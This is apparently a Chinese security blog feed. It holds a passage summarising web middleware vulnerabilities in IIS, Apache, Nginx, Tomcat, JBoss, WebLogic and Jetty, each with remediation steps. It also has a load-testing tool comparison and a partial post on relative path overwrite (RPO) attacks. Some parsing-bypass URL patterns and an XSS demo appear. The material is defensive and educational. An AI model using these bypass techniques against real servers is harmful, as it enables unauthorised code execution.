远程执行代码漏洞存在于HTTP协议堆栈(HTTP.sys)中，当HTTP.sys未正确分析经特殊设计的HTTP请求时会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/MS15-034.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
安装修复补丁（KB3042553）</li>
</ul>
<h3 id="2apache">2.Apache</h3>
<ul>
<li><strong>2.1 Apache多后缀解析漏洞</strong><br>
<strong>漏洞原理：</strong><br>
Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别（不在mime.types文件内），则继续向左识别，直到识别到合法后缀才进行解析；利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</li>
</ul>
<pre><code>例如：http://127.0.0.1/phpinfo.php.xxx
## 由于向左解析准则，.xxx不是可识别的文件格式，phpinfo.php.xxx会解析成phpinfo.php  
以下配置问题也会导致解析漏洞：
（1）如果配置有AddHandler php5-script .php，这时只要文件名里包含.php，如test2.php.jpg，也会以php来执行。
（2）如果配置有AddType application/x-httpd-php .jpg 即使扩展名是.jpg，一样能以 php 方式执行。
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/apache%E8%A7%A3%E6%9E%90.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).apache配置文件，禁止.php这样的文件执行;</p>
<pre><code> &lt;Files ~ “.(php.|php3.)”&gt; 
         Order Allow,Deny 
         Deny from all 
 &lt;/Files&gt;
</code></pre>
<p>(2).用伪静态重写类似.php.*这类文件，在httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so,把注释去掉重启apache,在网站根目录建立.htaccess文件,代码如下:</p>
<pre><code>&lt;IfModule mod_rewrite.c&gt;
RewriteEngine On
RewriteRule .(php.|php3.) /index.php
RewriteRule .(pHp.|pHp3.) /index.php
RewriteRule .(phP.|phP3.) /index.php
RewriteRule .(Php.|Php3.) /index.php
RewriteRule .(PHp.|PHp3.) /index.php
RewriteRule .(PhP.|PhP3.) /index.php
RewriteRule .(pHP.|pHP3.) /index.php
RewriteRule .(PHP.|PHP3.) /index.php
&lt;/IfModule&gt;
</code></pre>
<ul>
<li><strong>2.2 Apache换行解析漏洞(CVE-2017-15715)</strong><br>
<strong>漏洞原理：</strong><br>
Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页在2.4.0~2.4.29版本存在一个解析漏洞，在解析php时，1.php\x0A将按照php后缀进行解析，导致绕过一些服务器的安全策略。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/Apache%E6%8D%A2%E8%A1%8C.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).升级到最新版本;<br>
(2).将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</li>
<li><strong>2.3 Apache目录遍历漏洞</strong><br>
<strong>漏洞原理：</strong><br>
当客户端访问到一个目录时，Apache服务器将会默认寻找一个index list中的文件，若文 件不存在，则会列出当前目录下所有文件或返回403状态码，而列出目录下所有文件的行为称为目录遍历。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/apache%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86.png" alt="" loading="lazy"><br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/apache%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%862.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
在httpd.conf中将“+Indexes”修改为“-Indexes”，禁止目录浏览</li>
</ul>
<h3 id="3nginx">3.Nginx</h3>
<ul>
<li><strong>3.1 Nginx解析漏洞</strong><br>
<strong>漏洞原理：</strong><br>
Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME,然后将SCRIPT_FILENAME传递给PHP CGI，如访问网站http://xxx.com/phpinfo.jpg/1.php，匹配到的SCRIPT_FILENAME应该是1.php，如果开启了fix_pathinfo参数，那么就会触发在PHP中的如下逻辑：PHP认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了。</li>
</ul>
<pre><code>常见的解析形式：
www.xxxx.com/UploadFiles/image/1.jpg/1.php
www.xxxx.com/UploadFiles/image/1.jpg%00.php
www.xxxx.com/UploadFiles/image/1.jpg/%20\\0.php
xxx.jpg%00.php (Nginx &lt;8.03空字节代码执行漏洞)
</code></pre>
<p><strong>修复方案：</strong><br>
(1).修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>
(2).在Nginx配置文件中添加以下代码：</p>
<pre><code> if ( $fastcgi_script_name ~ ..*/.*php ) {
 return 403;
 }
 ##当匹配到类似test.jpg/a.php的URL时，将直接返回403错误代码
</code></pre>
<ul>
<li><strong>3.2 Nginx目录遍历漏洞</strong><br>
<strong>漏洞原理：</strong><br>
Nginx的目录遍历与apache一样,属于配置方面的问题,nginx.conf错误的配置可导致目录遍历与源码泄露；错误配置如下：</li>
</ul>
<pre><code>location / {
    autoindex on;
    root html;
    index index.html index.htm;
    }
</code></pre>
<p><strong>修复方案：</strong><br>
在/usr/local/nginx/conf/nginx.conf位置中修改autoindex off,或者删除autoindex on。</p>
<ul>
<li><strong>3.3 Nginx CRLF注入漏洞</strong><br>
<strong>漏洞原理：</strong><br>
CRLF是“回车+换行”（\r\n)键的简称，HTTPHeader与HTTPBody时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来，通过控制HTTP消息头中的字符，注入恶意换行，就能注入一些会话cookie或者html代码，由于nginx.conf配置不正确，导致注入的代码会被执行。<br>
在用nginx访问一个链接时，会用https协议访问，并且返回一个302found给用户，其中的$uri是我们可以控制的，通过注入一个CRLF和两个CRLF来选择注入到http header还是http body。</li>
</ul>
<pre><code>##错误配置如下：
location / {
    try_files $uri $uri/ =404;
    #autoindex on;
    #alias /home/;
    return 302 https://$host$uri;
    }
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/nginxCRLF%E6%B3%A8%E5%85%A5.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
Nginx的配置文件/etc/nginx/conf.d/error1.conf修改为使用不解码的url跳转。</p>
<ul>
<li><strong>3.4 Nginx目录穿越漏洞</strong><br>
<strong>漏洞原理：</strong><br>
Nginx在配置别名(Alias)时/files配置为/home/的别名,那么当我们访问/files../时,nginx实际处理的路径时/home/../,从而实现了穿越目录。</li>
</ul>
<pre><code>server {
    listen      80;
    server_name localhost;
location /files {
   autoindex on;
   alias /home/;
   }
}
</code></pre>
<p><strong>修复方案：</strong><br>
修改/usr/local/nginx/conf/nginx.conf，使用/闭合/files,形成/files/。</p>
<h3 id="4tomcat">4.Tomcat</h3>
<ul>
<li><strong>4.1 Tomcat文件包含漏洞(CVE-2020-1938)</strong><br>
<strong>漏洞原理：</strong><br>
该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件，如:webapp配置文件或源代码等。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</li>
</ul>
<pre><code>## 影响版本：
Apache Tomcat 6.x
Apache Tomcat 7.x &lt; 7.0.100
Apache Tomcat 8.x &lt; 8.5.51
Apache Tomcat 9.x &lt; 9.0.31
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/tomcat%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.png" alt="" loading="lazy"></figure>
<p><strong>修复方案：</strong><br>
(1).禁用AJP协议；</p>
<pre><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt;
</code></pre>
<p>(2).升级到tomcat对应安全版本；<br>
(3).配置secret来设置AJP协议的认证凭证，如：</p>
<pre><code>&lt;Connector port=&quot;8009&quot;protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt;
</code></pre>
<ul>
<li><strong>4.2 Tomcat后台弱口令&amp;&amp;部署war包RCE漏洞</strong><br>
<strong>漏洞原理：</strong><br>
Tomcat默认后台存在弱口令，可被暴力破解手段破解；且Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下，直接获取服务器权限。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).修改后台默认密码，在系统上以低权限运行Tomcat应用程序,创建一个专门的Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）；<br>
(2).增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置），在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制；<br>
(3).以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</li>
<li><strong>4.3 Tomcat远程代码执行漏洞(CVE-2017-12615)</strong><br>
<strong>漏洞原理：</strong><br>
当7.0.0 - 7.0.81版本的Tomcat运行在Windows主机上，且启用了HTTP PUT请求方法，攻击者通过构造的攻击请求向服务器上传包含任意代码的JSP文件，造成任意代码执行。<br>
Tomcat的Servlet是在conf/web.xml配置的，通过配置文件可知，当后缀名为.jsp和.jspx的时候，是通过JspServlet处理请求的；而其他的静态文件是通过DefaultServlet处理的，例如“1.jsp ”（末尾有空格）并不能匹配到JspServlet，而是会交由DefaultServlet去处理；当处理PUT请求时,会调用resources.bind：dirContext为FileDirContext调用rebind创建文件,又由于Windows不允许空格作为文件名结尾，所以会创建一个.jsp 文件，导致代码执行。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/CVE-2017-12615.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).配置readonly值为True或注释参数，禁止使用PUT方法并重启tomcat;<br>
(2).根据官方补丁升级最新版本。</li>
<li><strong>4.4 Tomcat远程代码执行漏洞(CVE-2019-0232)</strong><br>
<strong>漏洞原理：</strong><br>
该漏洞只对Windows平台有效，攻击者向CGI Servlet发送请求，可在具有Apache Tomcat权限的系统上注入和执行任意操作系统命令。漏洞成因是当将参数从JRE传递到Windows环境时，由于CGI_Servlet中的输入验证错误而存在该漏洞。</li>
</ul>
<pre><code>## 影响版本
Apache Tomcat 9.0.0.M1 ~ 9.0.17
Apache Tomcat 8.5.0 ~ 8.5.39
Apache Tomcat 7.0.0 ~ 7.0.93
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/CVE-2019-0232.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).禁用enableCmdLineArguments参数;<br>
(2).在conf/web.xml中覆写采用更严格的参数合法性检验规则;<br>
(3).升级到对应的安全版本。</p>
<h3 id="5jboss">5.JBoss</h3>
<ul>
<li><strong>5.1 Jboss4.x JMX Console未授权访问漏洞</strong><br>
<strong>漏洞原理：</strong><br>
Jboxx4.x的/jmx-console/后台存在未授权访问,此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进⼊到jmx控制台，并在其中执行任何功能,可直接部署war包Getshell。<br>
<strong>修复方案：</strong><br>
(1).关闭或禁止对外开放jmx-console和web-console；<br>
(2).限制访问来源ip。</li>
<li><strong>5.2 Jboss4.x JMX Console HtmlAdaptor RCE漏洞(CVE-2007-1036)</strong><br>
<strong>漏洞原理：</strong><br>
基于未授权访问的基础上，该漏洞利用的是后台中【jboss.admin】-&gt;【DeploymentFileRepository】-&gt;【store()】方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容；通过控制这四个参数即可上传shell，控制整台服务器。<br>
具有相同特点的还有CVE-2007-1036和CVE-2006-5750漏洞。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/cve-2007-1036.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).禁止对外开放后台jmx-console；<br>
(2).升级到安全版本。</li>
<li><strong>5.3 Jboss4.x MQ JMS反序列化漏洞(CVE-2017-7504)</strong><br>
<strong>漏洞原理：</strong><br>
JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤该漏洞执行任意代码。<br>
<strong>修复方案：</strong><br>
(1).将JBoss版本升级到最新；<br>
(2).尽量不要将JBoss映射到公网。</li>
<li><strong>5.4 JBoss6.x JMXInvokerServlet反序列化漏洞(CVE-2015-7501)</strong><br>
<strong>漏洞原理：</strong><br>
JBoss6.x版本在/invoker/JMXInvokerServlet请求中读取了用户传入的对象，然后我们可以利用Apache Commons Collections中的Gadget执行任意代码；由于JBoss中的invoker/JMXInvokerServlet路径默认是对外开放，所以JBoss的jmx组件⽀持Java反序列化。</li>
</ul>
<pre><code>## 影响范围：
JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10
JBoss AS (Wildly) 6 and earlier
JBoss A-MQ 6.2.0
JBoss Fuse 6.2.0
JBoss SOA Platform (SOA-P) 5.3.1
JBoss Data Grid (JDG) 6.5.0
JBoss BRMS (BRMS) 6.1.0
JBoss BPMS (BPMS) 6.1.0
JBoss Data Virtualization (JDV) 6.1.0
JBoss Fuse Service Works (FSW) 6.0.0
JBoss Enterprise Web Server (EWS) 2.1,3.0
</code></pre>
<p><strong>修复方案：</strong><br>
(1).安装对应补丁https://access.redhat.com/security/cve/cve-2015-7501；<br>
(2).升级到最新版本。</p>
<ul>
<li><strong>5.5 JBoss 5.x/6.x反序列化漏洞(CVE-2017-12149)</strong><br>
<strong>漏洞原理：</strong><br>
该漏洞为Java反序列化错误类型，存在于Jboss的HttpInvoker组件中的ReadOnlyAccessFilter过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞；该漏洞出现在/invoker/readonly请求中，服务器将用户提交的POST内容进行了Java反序列化,导致传入的携带恶意代码的序列化数据执行。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/cve-2017-12149.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).不需要 http-invoker.sar 组件的用户可直接删除此组件；<br>
(2).添加如下代码至http-invoker.sar下web.xml的security-constraint标签中；</li>
</ul>
<pre><code>&lt;url-pattern&gt;/*&lt;/url-pattern
</code></pre>
<p>(3).建议用户升级到JBOSS AS7。</p>
<h3 id="6weblogic">6.Weblogic</h3>
<ul>
<li><strong>6.1 Weblogic XML Decoder反序列化漏洞(CVE-2017-10271)</strong><br>
<strong>漏洞原理：</strong><br>
Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。攻击者发送精心构造的xml数据甚至能通过反弹shell拿到权限。</li>
</ul>
<pre><code>## 影响版本：
Weblogic 10.3.6.0.0
Weblogic 12.1.3.0.0
Weblogic 12.2.1.1.0
Weblogic 12.2.1.2.0
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/cve-2017-10271.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).下载安全补丁http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html；<br>
(2).根据实际环境路径，删除WebLogicwls-wsat组件，删除相关文件后重启weblogic，保证访问wls-wsat/ 提示404错误。</p>
<ul>
<li><strong>6.2 Weblogic 任意文件上传漏洞(CVE-2019-2618)</strong><br>
<strong>漏洞原理：</strong><br>
该漏洞主要是利用了WebLogic组件中的DeploymentService接口，该接口支持向服务器上传任意文件。攻击者突破了OAM（Oracle Access Management）认证，设置wl_request_type参数为app_upload，构造文件上传格式的POST请求包，上传jsp木马文件，进而可以获得整个服务器的权限。</li>
</ul>
<pre><code>## 影响版本：
Weblogic 10.3.6.0
Weblogic 12.1.3.0
Weblogic 12.2.1.3
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/cve-2019-2618.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
下载安装官方补丁https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html</p>
<ul>
<li><strong>6.3 Weblogic 未授权远程命令执行漏洞(CVE-2020-14882、14883)</strong><br>
<strong>漏洞原理：</strong><br>
未经身份验证的远程攻击者可能通过构造特殊的HTTP GET请求，利用该漏洞在受影响的 WebLogic Server上执行任意代码，它们均存在于WebLogic的Console控制台组件中。此组件为WebLogic全版本默认自带组件，且该漏洞通过HTTP协议进行利用，将CVE-2020-14882和CVE-2020-14883进行组合利用后，远程且未经授权的攻击者可以直接在服务端执行任意代码获取系统权限。</li>
</ul>
<pre><code>##影响版本：
Oracle WebLogic Server 版本10.3.6.0
Oracle WebLogic Server 版本12.1.3.0
Oracle WebLogic Server 版本12.2.1.3
Oracle WebLogic Server 版本12.2.1.4
Oracle WebLogic Server 版本14.1.1.0
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/cve-2020-14882.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
请受影响用户及时下载补丁程序并安装更新https://www.oracle.com/security-alerts/cpuoct2020.html</p>
<ul>
<li><strong>6.4 Weblogic SSRF漏洞</strong><br>
<strong>漏洞原理：</strong><br>
Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。SSRF漏洞可以通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</li>
</ul>
<pre><code>##影响范围
Oracle WebLogic Server 10.3.6.0
Oracle WebLogic Server 10.0.2.0
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/weblogicssrf.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).如果不需要UDDI功能，就关闭这个功能。可以删除uddiexporer文件夹，可以可在/web在/weblogicPath/server/lib/uddiexplorer.war解压后，注释掉上面的jsp再打包;<br>
(2).安装更新补丁包http://www.oracle.com/technetwork/topics/security/cpujul2014-1972956.html。</p>
<h3 id="7jetty">7.Jetty</h3>
<ul>
<li><strong>7.1 Jetty WEB-INF敏感信息泄露漏洞(CVE-2021-28164、CVE-2021-34429)</strong><br>
<strong>漏洞原理：</strong><br>
该漏洞主要是由于Jetty 9.4.37引入对RFC3986的新实现，而URL编码的.字符被排除在URI规范之外，这个行为在RFC中是正确的，但在servlet的实现中导致攻击者可以通过%2e来绕过限制，下载WEB-INF目录下的任意文件，导致敏感信息泄露。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/cve-2021-34429.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
(1).过滤掉/.等特殊字符；<br>
(2).升级到9.4.43及以上安全版本。</li>
<li><strong>7.2 Jetty Utility Servlets ConcatServlet双重解码信息泄露漏洞(CVE-2021-28169)</strong><br>
<strong>漏洞原理：</strong><br>
在9.4.40, 10.0.2, 11.0.2版本前，Jetty Servlets中的ConcatServlet、WelcomeFilter类存在多重解码问题，如果开发者主动使用了这两个类，攻击者可以利用其访问WEB-INF目录下的敏感文件，造成配置文件及代码泄露。</li>
</ul>
<pre><code>##影响版本：
jetty 9.4.40
jetty 10.0.2
jetty 11.0.2
</code></pre>
<p><img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/cve-2021-28169.png" alt="" loading="lazy"><br>
<strong>修复方案：</strong><br>
建议受影响的用户及时更新升级到最新版本https://www.eclipse.org/jetty/download.php</p>
<h2 id="三-总结">三、总结</h2>
<p>未知攻、焉知防，黑客常常利用网站操作系统的漏洞和Web中间件漏洞等得到Web服务器的控制权限，轻则篡改网页内容，重则窃取重要内部数据，更为严重的则是在网页中植入恶意代码，使得网站访问者受到侵害。守护网站的安全需要我们时时刻刻关注安全动态！</p>
<h2 id="四-参考">四、参考</h2>
<p>https://www.cnblogs.com/bonelee/p/14727268.html<br>
https://www.shuzhiduo.com/A/obzbQmQbdE</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[几款常见的压测工具比较]]></title>
        <id>https://0kccc.github.io/post/ji-kuan-chang-jian-de-ya-ce-gong-ju-bi-jiao/</id>
        <link href="https://0kccc.github.io/post/ji-kuan-chang-jian-de-ya-ce-gong-ju-bi-jiao/">
        </link>
        <updated>2021-03-25T02:42:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="1abapache-benchmark">1.ab（Apache Benchmark）</h3>
<ul>
<li>简介<br>
ab就是Apache Benchmark的缩写，顾名思义它是Apache组织开发的一款web压力测试工具。ab又是一个命令行工具，使用方便，统计功能强大，对发起负载的本机要求很低，根据ab命令可以创建很多的并发访问线程，模拟多个访问者同时对某一URL地址进行访问，因此可以用来测试目标服务器的负载压力，但是没有图形化结果，不能监控。</li>
<li>安装</li>
</ul>
<pre><code># linux安装
sudo yum -y install httpd
# windows安装
https://www.apachelounge.com/download/ 直接下载解压使用
</code></pre>
<ul>
<li>使用</li>
</ul>
<pre><code>Usage: ab [options] [http[s]://]hostname[:port]/path
用法：ab [选项] 地址

选项：
Options are:
    -n requests      #执行的请求数，即一共发起多少请求。
    -c concurrency   #请求并发数。
    -s timeout       #指定每个请求的超时时间，默认是30秒。
    -k               #启用HTTP KeepAlive功能，即在一个HTTP会话中执行多个请求。默认时，不启用KeepAlive功能。
</code></pre>
<ul>
<li>结果<br>
例如：对baidu.com发起30个请求，并发数为3<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/1.png" alt="" loading="lazy"></li>
</ul>
<h3 id="2jmeter">2.jmeter</h3>
<ul>
<li>简介<br>
Apache JMeter是Apache组织开发的基于Java的压力测试工具，在很多场合如个人测试，企业测试中都有广泛应用。</li>
<li>安装<br>
直接访问<a href="http://jmeter.apache.org/download_jmeter.cgi">http://jmeter.apache.org/download_jmeter.cgi</a>下载解压使用<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/2.png" alt="" loading="lazy"></li>
<li>使用<br>
JMeter使用功能强大，这里我以简单的测试例子来做下介绍<br>
添加线程组<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/3.png" alt="" loading="lazy"><br>
设置线程组参数<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/4.png" alt="" loading="lazy"><br>
在线程租添加HTTP请求<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/5.png" alt="" loading="lazy"><br>
设置HTTP请求详细信息<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/6.png" alt="" loading="lazy"><br>
可以在该HTTP请求下添加运行结果监视器<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/7.png" alt="" loading="lazy"><br>
运行<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/8.png" alt="" loading="lazy"></li>
<li>结果<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/9.png" alt="" loading="lazy"><br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/10.png" alt="" loading="lazy"><br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/11.png" alt="" loading="lazy"></li>
</ul>
<h3 id="3locust">3.locust</h3>
<ul>
<li>简介<br>
locust是非常简单易用、分布式、python开发的压力测试工具。支持分布式测试，跨平台、易扩展，有图形化界面，可以快捷操作和下载报告。</li>
<li>安装</li>
</ul>
<pre><code># 支持的python版本：2.7、3.X
# pip3 安装locust
pip3  install locust
# 查看是否安装成功
locust -h
# 运行 Locust 分布在多个进程/机器库
pip3 install pyzmq
# webSocket 压测库
pip3 install websocket-client
</code></pre>
<ul>
<li>使用<br>
编写压测脚本<strong>ceshi.py</strong></li>
</ul>
<pre><code>from locust import HttpLocust, TaskSet, task

# 定义用户行为
class UserBehavior(TaskSet):

    @task
    def baidu_index(self):
        self.client.get(&quot;/&quot;)


class WebsiteUser(HttpLocust):
    task_set = UserBehavior # 指向一个定义的用户行为类
    min_wait = 3000 # 执行事务之间用户等待时间的下界（单位：毫秒）
    max_wait = 6000 # 执行事务之间用户等待时间的上界（单位：毫秒）
</code></pre>
<p>简单的运行</p>
<pre><code>locust -f locust测试脚本.py --host=URL地址
</code></pre>
<p>访问 http://localhost:8089 进入压测首页,点击start swarming进入压测界面<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/12.png" alt="" loading="lazy"></p>
<ul>
<li>结果<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/13.png" alt="" loading="lazy"></li>
</ul>
<h2 id="比较">比较：</h2>
<table>
<thead>
<tr>
<th></th>
<th>ab</th>
<th>Jmeter</th>
<th>locust</th>
</tr>
</thead>
<tbody>
<tr>
<td>使用语言</td>
<td>C</td>
<td>Java</td>
<td>Python</td>
</tr>
<tr>
<td>图形界面</td>
<td>无</td>
<td>有</td>
<td>有</td>
</tr>
<tr>
<td>优势</td>
<td>使用简单，上手学习较快，提供需要的基本性能指标</td>
<td>功能强大，插件丰富，支持生成HTML报告</td>
<td>支持分布式、压测数据支持导出</td>
</tr>
</tbody>
</table>
<h2 id="参考">参考：</h2>
<p>https://docs.locust.io/en/stable/<br>
https://httpd.apache.org/docs/2.2/programs/ab.html<br>
https://jmeter.apache.org/usermanual/get-started.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[RPO攻击技术分析]]></title>
        <id>https://0kccc.github.io/post/rpo-gong-ji-ji-zhu-fen-xi/</id>
        <link href="https://0kccc.github.io/post/rpo-gong-ji-ji-zhu-fen-xi/">
        </link>
        <updated>2020-12-25T02:21:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="rpo攻击是什么">RPO攻击是什么</h2>
<p>RPO全称Relative Path Overwrite(相对路径覆盖)，一种“欺骗”型攻击技术。其原理就是<strong>利用服务器与浏览器对URL解析的差异，将页面中使用相对路径引入的静态资源文件解析成其他资源文件或者我们可以控制内容的页面</strong>，从而导致XSS、任意文件读取、信息泄露等漏洞的产生。</p>
<h2 id="利用条件">利用条件</h2>
<ul>
<li>配置错误的apache服务器(开启AllowEncodedSlashes选项),或者nginx服务器。</li>
<li>存在相对路径的js或者css的引用</li>
</ul>
<h4 id="服务器解析差异">服务器解析差异</h4>
<p>要利用该漏洞首先得了解不同服务器的解析差异，我们可以通过一个简单的测试来区分服务器对URL的解析差异，现在可以在rpotest目录下创建一个空的test文件夹和一个内容为“I'm rpotest”的test.php文件,当成功访问时会输出该内容。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/rpo.png" alt="" loading="lazy"><br>
现在分别请求apache和nginx服务器下该链接的访问情况:<strong>http://127.0.0.1/rpotest/xxxxx/..%2Ftest.php</strong></p>
<ul>
<li>apache:<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/apache.png" alt="" loading="lazy"></li>
<li>nginx:<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/nginx.png" alt="" loading="lazy"><br>
从上图的访问情况可以看到对于同样的URL,apache和nginx服务器的处理方式是不同的，Apache服务器默认情况下是不解析%2F,也就是说服务器解析处理到xxxxx目录后认为..%2Ftest.php是一个文件，此时没有这个文件的所以返回404；而ngin服务器会先解码%2F为/，请求会变成/rpotest/xxxxx/../test.php，并且../会向前跳转到rpotest目录下，ci此时rpotest目录下有test.php文件，所以成功返回内容。</li>
</ul>
<h2 id="漏洞利用">漏洞利用</h2>
<p>在rpotest目录下创建一个test.php和一个空的rpo.js，test文件夹内创建另一个内容为alert('QAQ')的rpo.js。<br>
test.php内容：</p>
<pre><code>&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;rpo攻击测试&lt;/title&gt;
    &lt;script type=&quot;text/javascript&quot; src=&quot;rpo.js&quot;&gt;&lt;/script&gt; //这里引用相对路径下的rpo.js
&lt;/head&gt;
&lt;body&gt;
    &lt;?php echo &quot;RPO test&quot;; ?&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<p>先来看下正常访问test.php时，会加载根目录下的rpo.js(即rpotest目录下这个空的rpo.js)  。<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/rpojs.png" alt="" loading="lazy"><br>
但是当我们访问<strong>http://127.0.0.1/rpotest/test/..%2ftest.php</strong>时会发现该test.php竟然会调用test文件夹下rpo.js然后出现弹框现象？<br>
<img src="https://okc-pic.oss-cn-beijing.aliyuncs.com/img/test-js.png" alt="" loading="lazy"><br>
我们来深度解析一下这一现象具体是怎么实现的：当我们访问http://127.0.0.1/rpotest/test/..%2ftest.php时向服务器发起请求，服务器首先解码%2F然后向上目录跳转即：http://127.0.0.1/rpotest/test.php，  然后返回test.php给浏览器，由浏览器开始处理test.php中的各css、js脚本；但是由于浏览器并不会解码%2F这个符号，所以浏览器加载的还是http://127.0.0.1/rpotest/test/..%2ftest.php这个url，同样的把会把..%2ftest.php当成一个文件，所以当前目录是/test,并且此时test.php引用的相对路径下的rpo.js文件是/test/rpo.js,因此造成弹框！</p>
<h3 id="特性利用">特性利用</h3>
<p>如果是开启URL重写的伪静态网站的话(pathinfo模式)，那么漏洞利用将会变得轻而易举了。什么是pathinfo模式？简单举例你一定一看就懂：</p>
<pre><code>http://xxx.com/news/index.php?test=123
等同于
http://xxx.com/news/123.html
</code></pre>
<ul>
